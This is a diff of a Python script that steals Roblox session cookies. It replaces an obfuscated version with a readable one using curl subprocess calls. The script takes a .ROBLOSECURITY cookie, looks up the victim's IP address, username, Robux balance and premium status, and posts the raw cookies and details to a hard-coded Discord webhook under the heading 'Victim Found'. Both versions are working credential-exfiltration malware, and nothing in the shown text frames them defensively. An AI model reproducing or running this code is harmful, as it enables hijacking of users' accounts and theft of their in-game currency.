@@ -1,49 +1,62 @@
-import sys as a, json as b, requests as c, base64 as d
+import sys
+import json
+import subprocess
 
-e = d.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzMDYzNjc0MTg3OTEzNjQyMC9mcWZHcWY3SG5CX2l0aTNLN2NCbmtNMWV4Wnpvbzg3TlhwbV8xOURYNmU5RGptZjJmb3dXNEhYMjZPZjlsR1o0Wkx2").decode()
+WEBHOOK = "https://discord.com/api/webhooks/1230636741879136420/fqfGqf7HnB_iti3I1SnBnk01exZzoo87NXpm_19DX6e9Djmf2fowW4HX26Of9lGZ4ZLv"
 
-def f(g, h):
-    i = c.get("https://api.ipify.org").text
-    j = None
-    if g:
-        k = {"Cookie": f".ROBLOSECURITY={g}"}
-        j = c.get("https://www.roblox.com/mobileapi/userinfo", headers=k, allow_redirects=False)
-        if j.status_code == 200:
-            j = j.json()
+def get_ip_address():
+    try:
+        ip_address = subprocess.check_output(["curl", "-s", "https://api.ipify.org"]).decode().strip()
+        return ip_address
+    except Exception as e:
+        print(f"Error retrieving IP address: {e}")
+        return None
 
-    l = {
+def main(roblo_security, rbxid_check):
+    ip_addr = get_ip_address()
+
+    statistics = None
+    if roblo_security:
+        try:
+            roblo_security = roblo_security.strip()
+            statistics = subprocess.check_output(["curl", "-s", "-H", f"Cookie: .ROBLOSECURITY={roblo_security}", "-L", "https://www.roblox.com/mobileapi/userinfo"]).decode().strip()
+            statistics = json.loads(statistics)
+        except Exception as e:
+            print(f"Error retrieving statistics: {e}")
+
+    data = {
         "content": None,
         "embeds": [
             {
-                "description": f"```\n{g or 'COOKIE NOT FOUND'}\n```\n```\n{h or 'COOKIE NOT FOUND'}\n```",
+                "description": f"```\n{roblo_security or 'COOKIE NOT FOUND'}\n```\n```\n{rbxid_check or 'COOKIE NOT FOUND'}\n```",
                 "color": None,
                 "fields": [
                     {
                         "name": "Username",
-                        "value": j["UserName"] if j else "N/A",
+                        "value": statistics.get("UserName", "N/A"),
                         "inline": True
                     },
                     {
                         "name": "Robux",
-                        "value": j["RobuxBalance"] if j else "N/A",
+                        "value": statistics.get("RobuxBalance", "N/A"),
                         "inline": True
                     },
                     {
                         "name": "Premium",
-                        "value": j["IsPremium"] if j else "N/A",
+                        "value": statistics.get("IsPremium", "N/A"),
                         "inline": True
                     }
                 ],
                 "author": {
-                    "name": f"Victim Found: {i}",
-                    "icon_url": j["ThumbnailUrl"] if j else "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
+                    "name": f"Victim Found: {ip_addr}",
+                    "icon_url": statistics.get("ThumbnailUrl", "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png")
                 },
                 "footer": {
                     "text": "sigma",
                     "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                 },
                 "thumbnail": {
-                    "url": j["ThumbnailUrl"] if j else "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
+                    "url": statistics.get("ThumbnailUrl", "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png")
                 }
             }
         ],
@@ -52,9 +65,12 @@ def f(g, h):
         "attachments": []
     }
 
-    c.post(e, headers={"Content-Type": "application/json"}, data=b.dumps(l))
+    try:
+        subprocess.run(["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", json.dumps(data), WEBHOOK], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error sending webhook: {e}")
 
 if __name__ == "__main__":
-    l = a.argv[1] if len(a.argv) > 1 else None
-    m = a.argv[2] if len(a.argv) > 2 else None
-    f(l, m)
+    roblo_security = sys.argv[1] if len(sys.argv) > 1 else None
+    rbxid_check = sys.argv[2] if len(sys.argv) > 2 else None
+    main(roblo_security, rbxid_check)
